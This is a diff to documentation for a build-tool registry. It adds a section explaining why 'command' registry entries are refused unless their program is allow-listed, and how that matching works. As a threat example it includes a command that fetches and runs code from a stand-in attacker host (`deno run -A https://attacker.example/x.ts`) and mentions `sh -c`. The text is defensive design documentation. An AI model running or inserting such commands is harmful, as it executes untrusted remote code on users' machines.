@@ -646,6 +646,21 @@ tool in an already-running server with **no restart**:
   Locations `./zuke
   register` writes are local, so this is invisible to the
   ordinary setup.
+- **A `command` location is gated the same way.** Its argv is not "code already
+  on the machine" the way a local module path is: whoever wrote the entry chose
+  the program **and its arguments**, so `deno run -A https://attacker.example/x.ts`
+  is the refused remote-module case spelled as a command, and `sh -c …` is
+  arbitrary code with no fetch at all. A command location is therefore refused
+  unless its program appears in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (same spelling:
+  comma- or space-separated, `*` allows any). The entry is matched against
+  `command[0]` both as written and as its trailing path segment, so `make`
+  admits `/usr/bin/make` while `/usr/bin/make` admits only itself. Naming a bare
+  program admits any program resolving under that name, and naming an
+  interpreter (`sh`, `deno`, `node`) hands the registry writer full execution,
+  since the arguments are theirs — both are the operator's call. The refusal is
+  a structured `launch_command_not_allowed` error, audited as `denied`, before
+  the confirmation prompt, with nothing spawned. `zuke register` writes a module
+  location, so this only bites a hand-authored or second-party entry.
 - **Parameters.** A run tool exposes the registered build's declared parameters
   as its input schema — keyed by the parameter's property name (e.g. `skipE2e`),
   with the kind, description, enum, and default from the descriptor. Supplied
